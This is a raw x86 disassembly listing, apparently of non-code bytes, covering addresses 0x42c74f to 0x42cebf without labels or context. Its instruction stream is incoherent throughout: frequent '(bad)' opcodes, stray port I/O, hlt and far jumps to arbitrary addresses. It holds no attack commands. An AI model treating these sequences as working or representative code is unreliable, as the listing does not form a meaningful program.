  42c74f:	loop   0x42c722
  42c751:	repnz rcr cl,cl
  42c754:	jmp    0xfcfd:0x3e90601
  42c75b:	int3   
  42c75c:	jmp    0xe52b8740
  42c761:	fst    st(4)
  42c763:	shl    ch,0xfa
  42c766:	mov    cl,0xf6
  42c768:	lods   eax,DWORD PTR ds:[esi]
  42c769:	neg    ah
  42c76b:	cli    
  42c76c:	fdivr  DWORD PTR [ecx-0x2708260d]
  42c772:	add    edi,edx
  42c774:	rcr    esp,cl
  42c776:	loop   0x42c73e
  42c778:	les    eax,FWORD PTR [edi]
  42c77a:	hlt    
  42c77b:	fucomip st,st(5)
  42c77d:	(bad)  
  42c77e:	in     eax,dx
  42c77f:	call   0xf22e706c
  42c784:	in     eax,dx
  42c785:	leave  
  42c786:	loopne 0x42c738
  42c788:	into   
  42c789:	stc    
  42c78a:	out    dx,al
  42c78b:	sar    BYTE PTR [esp+ebx*8+0x7fce1cd],cl
  42c792:	int    0x5
  42c794:	out    0xfb,eax
  42c796:	or     bh,bh
  42c798:	(bad)
  42c79b:	(bad)  
  42c79c:	in     eax,0x6
  42c79e:	out    0xe4,al
  42c7a0:	ret    
  42c7a1:	xlat   BYTE PTR ds:[ebx]
  42c7a2:	mov    dl,0xae
  42c7a4:	lods   al,BYTE PTR ds:[esi]
  42c7a5:	mov    al,0xcf
  42c7a7:	in     eax,0xee
  42c7a9:	fst    st(4)
  42c7ab:	ror    edx,cl
  42c7ad:	leave  
  42c7ae:	add    eax,edx
  42c7b0:	hlt    
  42c7b1:	add    edx,eax
  42c7b3:	fld    st(0)
  42c7b5:	mov    esp,0xdad902c0
  42c7ba:	jecxz  0x42c7ba
  42c7bc:	(bad)  
  42c7be:	shr    dh,0xc4
  42c7c1:	rol    eax,1
  42c7c3:	ret    0xecac
  42c7c6:	div    DWORD PTR [edi+esi*8-0xe0d0e2d]
  42c7cd:	std    
  42c7ce:	std    
  42c7cf:	repz xlat BYTE PTR ds:[ebx]
  42c7d1:	xlat   BYTE PTR ds:[ebx]
  42c7d2:	aam    0xd0
  42c7d4:	loop   0x42c7d7
  42c7d6:	test   BYTE PTR [ebx],0xee
  42c7d9:	push   es
  42c7da:	jmp    0x42c7ba
  42c7dc:	sti    
  42c7dd:	add    eax,ecx
  42c7df:	test   eax,0xc5dda4bd
  42c7e4:	in     al,0xfb
  42c7e6:	retf   
  42c7e7:	mov    al,0xf5
  42c7e9:	int3   
  42c7ea:	mov    ebx,0xf4d103f5
  42c7ef:	cmc    
  42c7f0:	sti    
  42c7f1:	shl    dh,0xdf
  42c7f4:	std    
  42c7f5:	inc    eax
  42c7f7:	add    dl,cl
  42c7f9:	loopne 0x42c7dd
  42c7fb:	repz into 
  42c7fd:	jecxz  0x42c7e5
  42c7ff:	mov    bl,0xd7
  42c801:	in     eax,0xca
  42c803:	out    dx,al
  42c804:	fcmovnbe st,st(1)
  42c806:	jmp    0xc63dbcf2
  42c80b:	cld    
  42c80c:	icebp  
  42c80d:	add    esi,ebp
  42c80f:	int3   
  42c810:	hlt    
  42c811:	xbegin 0xcc198fd8
  42c817:	fiadd  WORD PTR [ebx]
  42c819:	call   0xf435abff
  42c81e:	lods   al,BYTE PTR ds:[esi]
  42c81f:	ret    0xedf7
  42c822:	out    dx,al
  42c823:	fsub   st(4),st
  42c825:	test   al,0xc5
  42c827:	shr    dl,cl
  42c829:	rcr    dh,1
  42c82b:	enter  0xd1eb,0xf8
  42c82f:	add    ebx,esi
  42c831:	inc    DWORD PTR [edx+eiz*8]
  42c834:	or     eax,DWORD PTR [ecx]
  42c836:	sti    
  42c837:	(bad)  
  42c838:	cli    
  42c839:	frndint 
  42c83b:	in     eax,dx
  42c83c:	jecxz  0x42c817
  42c83e:	mov    bl,0xeb
  42c840:	loope  0x42c824
  42c842:	(bad)  
  42c843:	loop   0x42c81c
  42c845:	cli    
  42c846:	mov    bl,0xeb
  42c848:	int    0xed
  42c84a:	jmp    0xf6f9:0xce01cad2
  42c851:	cmc    
  42c852:	hlt    
  42c853:	shl    ecx,cl
  42c855:	(bad)  
  42c856:	fild   DWORD PTR [edi]
  42c858:	fsubrp st(0),st
  42c85a:	(bad)  
  42c85b:	cli    
  42c85c:	loope  0x42c856
  42c85e:	scas   eax,DWORD PTR es:[edi]
  42c85f:	ret    0xe8ad
  42c862:	not    ebp
  42c864:	les    edi,FWORD PTR [edx-0x4b291539]
  42c86a:	mov    bh,0xd9
  42c86c:	fsubrp st(1),st
  42c86e:	mov    esi,0x5bceef2
  42c873:	sti    
  42c874:	idiv   dh
  42c876:	lock aad 0xf9
  42c879:	sti    
  42c87a:	retf   0xc90c
  42c87d:	fucomp st(3)
  42c87f:	retf   0xd6f7
  42c882:	mov    dh,0xf0
  42c884:	repz rcr al,0xba
  42c888:	icebp  
  42c889:	mov    edi,0xdbdeeed8
  42c88e:	mul    eax
  42c890:	aam    0xbc
  42c892:	mov    esi,0xe1c7f3da
  42c897:	enter  0xf4f8,0xfd
  42c89b:	leave  
  42c89c:	add    al,0xfd
  42c89e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c89f:	les    esi,FWORD PTR [edx-0x18552814]
  42c8a5:	stc    
  42c8a6:	xlat   BYTE PTR ds:[ebx]
  42c8a7:	rcl    eax,1
  42c8a9:	hlt    
  42c8aa:	dec    bh
  42c8ac:	mov    ebx,0xf003f7f4
  42c8b1:	out    dx,al
  42c8b2:	ret    
  42c8b3:	int3   
  42c8b4:	sar    cl,0xe9
  42c8b7:	(bad)  
  42c8b9:	fldl2e 
  42c8bb:	retf   
  42c8bc:	or     cl,ah
  42c8be:	rol    al,0xae
  42c8c1:	out    0xad,eax
  42c8c3:	les    esi,FWORD PTR [ebx-0x818150c]
  42c8c9:	mov    bh,0xc9
  42c8cb:	mov    ecx,0xe0fed4da
  42c8d0:	iret   
  42c8d1:	jecxz  0x42c8b8
  42c8d3:	(bad)  
  42c8d4:	fcom   st(2)
  42c8d6:	ffree  st(1)
  42c8d8:	retf   
  42c8d9:	out    dx,al
  42c8da:	ret    
  42c8db:	fisttp DWORD PTR [edx]
  42c8dd:	leave  
  42c8de:	ror    esp,cl
  42c8e0:	retf   0xf0ad
  42c8e3:	retf   
  42c8e4:	lods   al,BYTE PTR ds:[esi]
  42c8e5:	xlat   BYTE PTR ds:[ebx]
  42c8e6:	icebp  
  42c8e7:	(bad)  
  42c8e8:	retf   0xf7e9
  42c8eb:	stc    
  42c8ec:	clc    
  42c8ed:	mov    al,0xfa
  42c8ef:	mul    bl
  42c8f1:	out    dx,al
  42c8f2:	add    al,0xd8
  42c8f4:	aam    0xe4
  42c8f6:	cmc    
  42c8f7:	aam    0xf7
  42c8f9:	aam    0xfe
  42c8fb:	out    dx,eax
  42c8fc:	jmp    0x42c8f8
  42c8fe:	mov    ecx,0xeec1c1a8
  42c903:	icebp  
  42c904:	in     al,0xf5
  42c906:	in     eax,0xf7
  42c908:	mov    ch,0xee
  42c90a:	mov    dh,0xc4
  42c90c:	mov    edi,0xf2c8e8d4
  42c911:	mov    edi,0xcb0be4bf
  42c916:	aad    0xf5
  42c918:	sar    al,0xc6
  42c91b:	fmul   st(6),st
  42c91d:	iret   
  42c91e:	in     al,0xf1
  42c920:	out    dx,al
  42c921:	repz shl edx,0xd2
  42c925:	rol    ecx,0xba
  42c928:	fcomp  st(6)
  42c92a:	into   
  42c92b:	fcmovne st,st(4)
  42c92d:	mov    esi,0xf70002c2
  42c932:	std    
  42c933:	aam    0xe2
  42c935:	aam    0xea
  42c937:	mov    esi,0xd8cdfcc1
  42c93c:	push   cs
  42c93d:	loop   0x42c8f2
  42c93f:	test   al,0xed
  42c941:	in     al,0xc9
  42c943:	scas   al,BYTE PTR es:[edi]
  42c944:	out    dx,eax
  42c945:	int    0xcb
  42c947:	enter  0xefec,0xbe
  42c94b:	leave  
  42c94c:	out    dx,eax
  42c94d:	call   0xedfbc12f
  42c952:	pop    es
  42c953:	xlat   BYTE PTR ds:[ebx]
  42c954:	ret    
  42c955:	jmp    0x42c935
  42c957:	ret    0xdcb
  42c95a:	fcmovnb st,st(6)
  42c95c:	push   es
  42c95d:	out    0xd3,al
  42c95f:	shr    esp,1
  42c961:	mov    esp,0xcad6f1dc
  42c966:	iret   
  42c967:	xlat   BYTE PTR ds:[ebx]
  42c968:	rol    ah,cl
  42c96a:	in     eax,dx
  42c96b:	jmp    0xd2459b44
  42c970:	mov    ecx,0xf0e0d6e5
  42c975:	(bad)  
  42c977:	or     bh,ah
  42c979:	out    0x3,eax
  42c97b:	out    0xce,eax
  42c97d:	add    ch,BYTE PTR [ebx-0x31300958]
  42c983:	(bad)  
  42c984:	(bad)  
  42c985:	sar    DWORD PTR [ecx-0x2c0a2d20],cl
  42c98b:	fcmove st,st(5)
  42c98d:	aam    0xfc
  42c98f:	idiv   BYTE PTR [ebp-0x80241ff]
  42c995:	loopne 0x42c99c
  42c997:	push   esi
  42c999:	jecxz  0x42c998
  42c99b:	fsin   
  42c99d:	adc    cl,ah
  42c99f:	scas   al,BYTE PTR es:[edi]
  42c9a0:	in     eax,0xf3
  42c9a2:	xlat   BYTE PTR ds:[ebx]
  42c9a3:	jmp    0x42c986
  42c9a5:	mov    dh,0xe1
  42c9a7:	int    0xd9
  42c9a9:	cli    
  42c9aa:	mov    dh,0xba
  42c9ac:	into   
  42c9ad:	clc    
  42c9ae:	out    dx,al
  42c9af:	(bad)  
  42c9b1:	(bad)  
  42c9b2:	in     al,dx
  42c9b3:	std    
  42c9b4:	inc    DWORD PTR [edx]
  42c9b6:	(bad)  
  42c9b7:	cli    
  42c9b8:	(bad)  
  42c9b9:	cli    
  42c9ba:	iret   
  42c9bb:	loop   0x42c9b7
  42c9bd:	add    esp,ebx
  42c9bf:	out    0xcf,al
  42c9c1:	(bad)  
  42c9c2:	leave  
  42c9c3:	lods   al,BYTE PTR ds:[esi]
  42c9c4:	jmp    0x42c9ac
  42c9c6:	mov    dl,0xe9
  42c9c8:	mov    bh,0xd3
  42c9ca:	mov    edi,0xd0efbffd
  42c9cf:	aad    0xf6
  42c9d1:	pop    es
  42c9d2:	pop    es
  42c9d3:	rol    ah,0xfc
  42c9d6:	add    BYTE PTR ds:0xec0ec7e8,al
  42c9dc:	repz in eax,0xec
  42c9df:	in     eax,dx
  42c9e0:	jecxz  0x42c9c7
  42c9e2:	jmp    0xf9d3:0xeab0ead7
  42c9e9:	int3   
  42c9ea:	aam    0xfb
  42c9ec:	fistp  QWORD PTR [ecx-0x19411f38]
  42c9f2:	neg    cl
  42c9f4:	shl    ch,cl
  42c9f6:	add    al,0xcb
  42c9f8:	fiadd  WORD PTR [edi]
  42c9fa:	ret    
  42c9fb:	add    al,ch
  42c9fd:	add    al,0xdc
  42c9ff:	rol    ebx,1
  42ca01:	mov    al,0xc4
  42ca03:	into   
  42ca04:	mov    al,0xb7
  42ca06:	(bad)  
  42ca07:	(bad)  
  42ca09:	aad    0xdd
  42ca0b:	icebp  
  42ca0c:	std    
  42ca0d:	aam    0xd5
  42ca0f:	hlt    
  42ca10:	loop   0x42c9ee
  42ca12:	lock add esp,ebx
  42ca15:	stc    
  42ca16:	fcmovb st,st(4)
  42ca18:	enter  0xcb0b,0xd8
  42ca1c:	stc    
  42ca1d:	cli    
  42ca1e:	test   al,0xb1
  42ca20:	enter  0xceaf,0xd1
  42ca24:	jmp    0x42c9db
  42ca26:	int    0xcf
  42ca28:	stc    
  42ca29:	lods   al,BYTE PTR ds:[esi]
  42ca2a:	cld    
  42ca2b:	mov    dh,0xc3
  42ca2d:	aam    0xd4
  42ca2f:	shl    dh,cl
  42ca31:	(bad)  
  42ca32:	out    0x2,al
  42ca34:	pop    es
  42ca35:	aam    0xdb
  42ca37:	jmp    0xc94ea313
  42ca3c:	loop   0x42ca17
  42ca3e:	(bad)  
  42ca3f:	mov    eax,0xb5b1ebf0
  42ca44:	repz div esp
  42ca47:	hlt    
  42ca48:	iret   
  42ca49:	mov    ah,0xe5
  42ca4b:	in     eax,dx
  42ca4c:	cli    
  42ca4d:	fsubr  st(0),st
  42ca4f:	fnstsw WORD PTR [ebp-0x2501440f]
  42ca55:	add    edi,edx
  42ca57:	add    al,0xfd
  42ca59:	cli    
  42ca5a:	in     al,0xec
  42ca5c:	into   
  42ca5d:	pop    es
  42ca5e:	jmp    0xb215aa09
  42ca63:	scas   al,BYTE PTR es:[edi]
  42ca64:	mul    ebp
  42ca66:	mov    bl,0xed
  42ca68:	jmp    0xfdfd:0x3bcdefb
  42ca6f:	test   bl,0xb8
  42ca72:	hlt    
  42ca73:	rcl    dh,1
  42ca75:	jecxz  0x42ca4b
  42ca77:	add    al,0xda
  42ca79:	fsubp  st(1),st
  42ca7b:	loopne 0x42ca45
  42ca7d:	cld    
  42ca7e:	in     eax,0xe4
  42ca80:	in     eax,dx
  42ca81:	mov    dh,0xc1
  42ca83:	scas   al,BYTE PTR es:[edi]
  42ca84:	mul    ah
  42ca86:	shl    BYTE PTR [edx-0x2b294450],0xf7
  42ca8d:	stc    
  42ca8e:	stc    
  42ca8f:	std    
  42ca90:	std    
  42ca91:	add    esi,edx
  42ca93:	les    edi,FWORD PTR [ecx-0x3b39173f]
  42ca99:	push   cs
  42ca9a:	fsubr  st,st(3)
  42ca9c:	cld    
  42ca9d:	jecxz  0x42ca66
  42ca9f:	in     al,0xb0
  42caa1:	jmp    0xcbb5:0xc4d0e7f0
  42caa8:	idiv   BYTE PTR [ecx-0x126fc4d]
  42caae:	fdivr  DWORD PTR [ebp+0x6f403f1]
  42cab4:	rol    DWORD PTR [edi],1
  42cab6:	or     DWORD PTR [ecx],eax
  42cab8:	in     al,0xde
  42caba:	add    al,0xb
  42cabc:	rcr    eax,0xb1
  42cabf:	test   eax,0xc7b5e1c8
  42cac4:	xlat   BYTE PTR ds:[ebx]
  42cac5:	out    dx,al
  42cac6:	rcl    dl,1
  42cac8:	mov    al,0xfe
  42caca:	lds    edi,FWORD PTR [edx-0x4123091d]
  42cad0:	shr    esi,0xd4
  42cad3:	rcl    dh,1
  42cad5:	aad    0xf9
  42cad7:	fcmovnb st,st(1)
  42cad9:	test   ch,0xb
  42cadc:	(bad)  
  42cadd:	out    dx,eax
  42cade:	scas   al,BYTE PTR es:[edi]
  42cadf:	mov    dl,0xc4
  42cae1:	int    0xbc
  42cae3:	shl    ebp,cl
  42cae5:	xlat   BYTE PTR ds:[ebx]
  42cae6:	clc    
  42cae7:	mov    al,0xf8
  42cae9:	into   
  42caea:	fcomip st,st(5)
  42caec:	aam    0xc9
  42caee:	out    dx,eax
  42caef:	fcomip st,st(7)
  42caf1:	add    dh,cl
  42caf3:	out    0xe1,al
  42caf5:	hlt    
  42caf6:	cli    
  42caf7:	loop   0x42cafd
  42caf9:	sti    
  42cafa:	enter  0xc8fe,0xfc
  42cafe:	call   0xc6049ce5
  42cb03:	mov    ah,0xd5
  42cb05:	in     eax,dx
  42cb06:	not    esi
  42cb08:	mov    edi,0xd7c4f6d4
  42cb0d:	(bad)  
  42cb0e:	mov    ebx,0x5fdf4d6
  42cb13:	mov    esp,0xffddeafa
  42cb18:	pop    es
  42cb19:	or     ecx,DWORD PTR [eax+ecx*1]
  42cb1c:	stc    
  42cb1d:	into   
  42cb1e:	stos   DWORD PTR es:[edi],eax
  42cb1f:	rol    cl,cl
  42cb21:	out    dx,al
  42cb22:	mov    cl,0xbc
  42cb24:	out    dx,eax
  42cb25:	rcr    eax,0xc5
  42cb28:	repnz mov dh,0xed
  42cb2b:	in     al,dx
  42cb2c:	jmp    0x42cae6
  42cb2e:	std    
  42cb2f:	sti    
  42cb30:	fsubrp st(5),st
  42cb32:	pop    es
  42cb33:	add    al,bl
  42cb35:	fcom   st(7)
  42cb37:	fcmovu st,st(0)
  42cb39:	clc    
  42cb3a:	(bad)  
  42cb3b:	enter  0xf8f2,0xef
  42cb3f:	scas   al,BYTE PTR es:[edi]
  42cb40:	mov    esi,0xfbf7eaf0
  42cb45:	test   al,0xd7
  42cb47:	aad    0xdb
  42cb49:	aam    0xf9
  42cb4b:	retf   
  42cb4c:	iret   
  42cb4d:	ret    0xcfec
  42cb50:	into   
  42cb51:	add    edx,ebx
  42cb53:	loop   0x42cb3f
  42cb55:	(bad)  
  42cb56:	call   0xc848ab23
  42cb5b:	jmp    0x42cb5d
  42cb5d:	or     esp,esi
  42cb5f:	out    dx,eax
  42cb60:	shl    DWORD PTR [eax-0x2933150a],1
  42cb66:	icebp  
  42cb67:	in     eax,dx
  42cb68:	ror    edi,1
  42cb6a:	int3   
  42cb6b:	mov    ecx,0xf6ecb4bd
  42cb70:	repz mov esp,0xfdfcdb
  42cb76:	ror    DWORD PTR [edx],1
  42cb78:	add    eax,ebp
  42cb7a:	leave  
  42cb7b:	cld    
  42cb7c:	out    0xdf,al
  42cb7e:	in     al,0xce
  42cb80:	rcr    esp,1
  42cb82:	in     al,dx
  42cb83:	out    0xd4,al
  42cb85:	sti    
  42cb86:	(bad)  
  42cb87:	int    0xe9
  42cb89:	in     al,dx
  42cb8a:	std    
  42cb8b:	leave  
  42cb8c:	rcr    cl,1
  42cb8e:	add    edi,ebp
  42cb90:	loope  0x42cb6f
  42cb92:	(bad)  
  42cb93:	rcl    ah,1
  42cb95:	aam    0xd7
  42cb97:	les    ecx,FWORD PTR [esi]
  42cb99:	out    0x0,al
  42cb9b:	in     al,0xc5
  42cb9d:	loope  0x42cb6b
  42cb9f:	in     al,dx
  42cba0:	lock jmp 0x42cb9a
  42cba3:	retf   
  42cba4:	leave  
  42cba5:	loopne 0x42cba2
  42cba7:	jmp    esi
  42cba9:	out    dx,eax
  42cbaa:	in     eax,dx
  42cbab:	mov    esi,0xddfae8d9
  42cbb0:	std    
  42cbb1:	in     eax,0xf1
  42cbb3:	lock cmc 
  42cbb5:	loope  0x42cb79
  42cbb7:	hlt    
  42cbb8:	ror    al,0xc8
  42cbbb:	aam    0xf2
  42cbbd:	out    dx,eax
  42cbbe:	stos   BYTE PTR es:[edi],al
  42cbbf:	enter  0xaec9,0xae
  42cbc3:	jecxz  0x42cbab
  42cbc5:	cli    
  42cbc6:	mov    bl,0xc5
  42cbc8:	out    dx,al
  42cbc9:	in     eax,dx
  42cbca:	not    bh
  42cbcc:	enter  0xf9c9,0xf0
  42cbd0:	inc    bl
  42cbd2:	sar    esp,1
  42cbd4:	cmc    
  42cbd5:	sti    
  42cbd6:	add    eax,0xfad4fce6
  42cbdb:	jmp    0x42cbcf
  42cbdd:	in     al,dx
  42cbde:	retf   
  42cbdf:	xlat   BYTE PTR ds:[ebx]
  42cbe0:	out    0xad,eax
  42cbe2:	test   eax,0xb0d8bbf0
  42cbe8:	enter  0xefba,0x3
  42cbec:	clc    
  42cbed:	ret    0xdfd6
  42cbf0:	in     eax,dx
  42cbf1:	clc    
  42cbf2:	std    
  42cbf3:	std    
  42cbf4:	ret    
  42cbf5:	inc    DWORD PTR [esi]
  42cbf7:	idiv   bl
  42cbf9:	hlt    
  42cbfa:	or     ebx,esp
  42cbfc:	out    0x5,eax
  42cbfe:	out    dx,al
  42cbff:	out    dx,al
  42cc00:	mov    esp,0xd2e2e7bd
  42cc05:	fcmovnb st,st(4)
  42cc07:	out    dx,eax
  42cc08:	lock mov eax,0xedbcf5fe
  42cc0e:	fnstsw ax
  42cc10:	mov    ebp,0xf3fbe4e3
  42cc15:	clc    
  42cc16:	dec    BYTE PTR [edx]
  42cc18:	add    ch,ch
  42cc1a:	retf   0xe3f3
  42cc1d:	iret   
  42cc1e:	lods   al,BYTE PTR ds:[esi]
  42cc1f:	test   eax,0xe0abf5b2
  42cc24:	cli    
  42cc25:	retf   0xe6c8
  42cc28:	mov    edi,0xbedadbd7
  42cc2d:	mov    ah,0xdf
  42cc2f:	loope  0x42cc2d
  42cc31:	lock (bad) 
  42cc33:	jmp    0x42cc2c
  42cc35:	shl    ecx,1
  42cc37:	inc    ecx
  42cc39:	add    ch,dh
  42cc3b:	retf   0xed0a
  42cc3e:	jmp    0xc8f591fb
  42cc43:	into   
  42cc44:	(bad)  
  42cc45:	fincstp 
  42cc47:	mov    bh,0xf5
  42cc49:	(bad)  
  42cc4b:	(bad)  
  42cc4c:	sar    DWORD PTR [edi-0x19f9fc32],cl
  42cc52:	pop    es
  42cc53:	fcmovnbe st,st(6)
  42cc55:	(bad)  
  42cc56:	test   BYTE PTR [edx],0xc6
  42cc59:	add    ebp,ebx
  42cc5b:	cli    
  42cc5c:	(bad)  
  42cc5e:	shl    DWORD PTR [ecx-0x1e3c5b3a],0xea
  42cc65:	out    dx,al
  42cc66:	mov    ah,0xd4
  42cc68:	lock std 
  42cc6a:	mov    ebp,0xe2efdebd
  42cc6f:	mov    ecx,0xf2bfe5d0
  42cc74:	out    0xde,al
  42cc76:	cld    
  42cc77:	add    bl,dh
  42cc79:	(bad)
  42cc7c:	push   cs
  42cc7d:	leave  
  42cc7e:	in     al,dx
  42cc7f:	rol    edi,cl
  42cc81:	jmp    0xc217904e
  42cc86:	(bad)  
  42cc87:	sti    
  42cc88:	mov    ah,0xf6
  42cc8a:	mov    ebp,0xd3ddc8ed
  42cc8f:	repz iret 
  42cc91:	loopne 0x42cc6e
  42cc93:	in     eax,0xf7
  42cc95:	cli    
  42cc96:	fisttp QWORD PTR [edx]
  42cc98:	imul   bh
  42cc9a:	out    0xfd,eax
  42cc9c:	iret   
  42cc9d:	iret   
  42cc9e:	lods   eax,DWORD PTR ds:[esi]
  42cc9f:	jmp    0x42cc4f
  42cca1:	xlat   BYTE PTR ds:[ebx]
  42cca2:	scas   eax,DWORD PTR es:[edi]
  42cca3:	jecxz  0x42cc52
  42cca5:	fcmovb st,st(5)
  42cca7:	hlt    
  42cca8:	in     al,0xc8
  42ccaa:	stc    
  42ccab:	int3   
  42ccac:	jmp    0xbecd:0x2d9b8
  42ccb3:	shl    edx,1
  42ccb5:	loop   0x42cca8
  42ccb7:	in     al,0xe2
  42ccb9:	(bad)  
  42ccba:	fmul   st,st(5)
  42ccbc:	(bad)  
  42ccbe:	stos   DWORD PTR es:[edi],eax
  42ccbf:	loopne 0x42cc6e
  42ccc1:	test   ah,0xee
  42ccc4:	xlat   BYTE PTR ds:[ebx]
  42ccc5:	into   
  42ccc6:	rcl    ebp,1
  42ccc8:	mov    ch,0xd8
  42ccca:	leave  
  42cccb:	div    BYTE PTR [esp+ebp*8-0x2a312d37]
  42ccd2:	in     al,dx
  42ccd3:	neg    eax
  42ccd5:	add    al,0xdc
  42ccd7:	or     DWORD PTR [ebx],eax
  42ccd9:	loope  0x42cca2
  42ccdb:	(bad)  
  42ccdf:	idiv   DWORD PTR [ebp-0x184b1c18]
  42cce5:	call   0xad22acb3
  42ccea:	in     eax,0xb6
  42ccec:	in     al,dx
  42cced:	repnz aam 0xfc
  42ccf0:	rcr    cl,1
  42ccf2:	mov    edi,0xe6e7dae7
  42ccf7:	out    0x5,al
  42ccf9:	in     eax,0xfd
  42ccfb:	int3   
  42ccfc:	or     dh,bl
  42ccfe:	lock repnz mov al,0xee
  42cd02:	into   
  42cd03:	aam    0xf1
  42cd05:	test   al,0xe0
  42cd07:	(bad)
  42cd0a:	(bad)  
  42cd0c:	test   DWORD PTR [ecx],0xfcd0d1f6
  42cd12:	shl    esi,1
  42cd14:	mov    ecx,0x3c8d6e1
  42cd19:	out    0x1,al
  42cd1b:	retf   
  42cd1c:	add    eax,0xc7e6ebe6
  42cd21:	mov    bl,0xc5
  42cd23:	xlat   BYTE PTR ds:[ebx]
  42cd24:	into   
  42cd25:	sti    
  42cd26:	in     al,0xf8
  42cd28:	leave  
  42cd29:	mov    dh,0xd8
  42cd2b:	(bad)  
  42cd2c:	fsubr  st,st(5)
  42cd2e:	(bad)  
  42cd30:	shl    esp,0xf6
  42cd33:	out    0xd0,al
  42cd35:	(bad)
  42cd38:	add    bl,bl
  42cd3a:	iret   
  42cd3b:	iret   
  42cd3c:	loope  0x42cd4c
  42cd3e:	(bad)  
  42cd3f:	lods   al,BYTE PTR ds:[esi]
  42cd40:	fmulp  st(7),st
  42cd42:	loop   0x42cd27
  42cd44:	(bad)  
  42cd46:	(bad)  
  42cd47:	loopne 0x42cd37
  42cd49:	aad    0xd7
  42cd4b:	int3   
  42cd4c:	mov    eax,0xe2c2b7fb
  42cd51:	out    0xde,eax
  42cd53:	jecxz  0x42cd12
  42cd55:	or     cl,BYTE PTR [edx]
  42cd57:	add    ch,dh
  42cd59:	hlt    
  42cd5a:	loop   0x42cd41
  42cd5c:	out    0x3,eax
  42cd5e:	fdivrp st(2),st
  42cd60:	mov    esp,0xd0f2adc4
  42cd65:	loop   0x42cd20
  42cd67:	hlt    
  42cd68:	rcl    dl,cl
  42cd6a:	rcl    esp,1
  42cd6c:	iret   
  42cd6d:	aam    0xde
  42cd6f:	mov    eax,0xbdddb8d0
  42cd74:	add    al,BYTE PTR [ecx]
  42cd76:	fldpi  
  42cd78:	enter  0xfcd8,0xcc
  42cd7c:	or     esp,edi
  42cd7e:	loope  0x42cd47
  42cd80:	mov    bl,0xca
  42cd82:	into   
  42cd83:	lock retf 
  42cd85:	ror    esi,1
  42cd87:	in     eax,0xad
  42cd89:	fbstp  TBYTE PTR [ebp-0x1211370a]
  42cd8f:	out    dx,al
  42cd90:	out    0xe7,eax
  42cd92:	cli    
  42cd93:	loop   0x42cd7f
  42cd95:	or     esp,edi
  42cd97:	jmp    0xe3db:0xd4f9d604
  42cd9e:	out    0xe2,eax
  42cda0:	lods   eax,DWORD PTR ds:[esi]
  42cda1:	jmp    0x42cd89
  42cda3:	loope  0x42cd8c
  42cda5:	shl    DWORD PTR [edx-0x2f0d0f46],0xdb
  42cdac:	cld    
  42cdad:	fdivr  st(3),st
  42cdaf:	stc    
  42cdb0:	into   
  42cdb1:	cli    
  42cdb2:	jecxz  0x42cdaf
  42cdb4:	(bad)  
  42cdb5:	mov    eax,0xfbbdd8da
  42cdba:	out    dx,al
  42cdbb:	(bad)  
  42cdbc:	fdivrp st(1),st
  42cdbe:	(bad)  
  42cdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cdc0:	mov    edi,0xe0c0d7dd
  42cdc5:	enter  0xd6d1,0xeb
  42cdc9:	out    dx,al
  42cdca:	iret   
  42cdcb:	les    edi,FWORD PTR [ecx-0x26040634]
  42cdd1:	aam    0x2
  42cdd3:	push   es
  42cdd4:	shl    ecx,0xca
  42cdd7:	retf   
  42cdd8:	add    eax,0xebfb0902
  42cddd:	std    
  42cdde:	jecxz  0x42cdc6
  42cde0:	scas   al,BYTE PTR es:[edi]
  42cde1:	mov    bl,0xcc
  42cde3:	repz loop 0x42cdb1
  42cde6:	mov    ch,0xf7
  42cde8:	icebp  
  42cde9:	mov    al,0xb9
  42cdeb:	leave  
  42cdec:	in     eax,dx
  42cded:	repz (bad) 
  42cdf0:	fstp   st(0)
  42cdf2:	hlt    
  42cdf3:	(bad)  
  42cdf4:	or     dl,al
  42cdf6:	add    al,BYTE PTR ds:0xfe0506e4
  42cdfc:	dec    DWORD PTR [ecx]
  42cdfe:	fadd   st,st(4)
  42ce00:	retf   0xb5ce
  42ce03:	(bad)  
  42ce04:	iret   
  42ce05:	repnz (bad) 
  42ce07:	retf   0xf5f0
  42ce0a:	sar    BYTE PTR [ebp-0x2a26260b],1
  42ce10:	clc    
  42ce11:	loop   0x42cdd6
  42ce13:	fdivr  st(3),st
  42ce15:	fstp   st(1)
  42ce17:	idiv   dl
  42ce19:	jmp    0x545d61c
  42ce1e:	shl    edx,0xee
  42ce21:	test   al,0xbd
  42ce23:	mov    cl,0xf6
  42ce25:	mov    ebx,0xdbd0d1cf
  42ce2a:	mov    bh,0xd9
  42ce2c:	fnstcw WORD PTR [ebx-0x232fd30]
  42ce32:	imul   ebx
  42ce34:	fld    DWORD PTR [edi]
  42ce36:	push   es
  42ce37:	imul   ebx
  42ce39:	imul   dl
  42ce3b:	or     cl,ch
  42ce3d:	stc    
  42ce3e:	ret    
  42ce3f:	lods   eax,DWORD PTR ds:[esi]
  42ce40:	iret   
  42ce41:	xlat   BYTE PTR ds:[ebx]
  42ce42:	mul    ah
  42ce44:	sar    dl,0xc9
  42ce47:	mov    eax,0xf3b9cbd2
  42ce4c:	mov    ebx,0xe0e703b0
  42ce51:	idiv   DWORD PTR [esi-0x2e1c2dff]
  42ce57:	test   esi,0x6e4d5e9
  42ce5d:	or     ch,ch
  42ce5f:	shl    bh,1
  42ce61:	fdivr  st(0),st
  42ce63:	out    0xc7,eax
  42ce65:	enter  0xceea,0xff
  42ce69:	mov    dh,0xf6
  42ce6b:	(bad)  
  42ce6d:	sar    DWORD PTR [edi-0xdfd0722],cl
  42ce73:	xlat   BYTE PTR ds:[ebx]
  42ce74:	fild   DWORD PTR [ebx]
  42ce76:	xlat   BYTE PTR ds:[ebx]
  42ce77:	pop    es
  42ce78:	xbegin 0xc047e27a
  42ce7e:	(bad)  
  42ce7f:	fsub   QWORD PTR [ebp-0x5329433b]
  42ce85:	mov    al,0xf4
  42ce87:	cli    
  42ce88:	enter  0xcec5,0xb5
  42ce8c:	(bad)  
  42ce8e:	stc    
  42ce8f:	sti    
  42ce90:	add    dl,bh
  42ce92:	(bad)  
  42ce93:	cli    
  42ce94:	lock add al,0xca
  42ce97:	shl    dl,0xf8
  42ce9a:	enter  0x903,0xf3
  42ce9e:	test   al,0xf7
  42cea0:	mov    al,0xf6
  42cea2:	enter  0xe0f4,0xec
  42cea6:	in     eax,dx
  42cea7:	shl    bl,1
  42cea9:	cli    
  42ceaa:	mov    ecx,0x3ecdfb8
  42ceaf:	(bad)  
  42ceb0:	mov    edi,0xd1fcd3dc
  42ceb5:	lock mul al
  42ceb8:	jmp    0xd809:0xf9e1c507
  42cebf:	shr    dl,0xd0
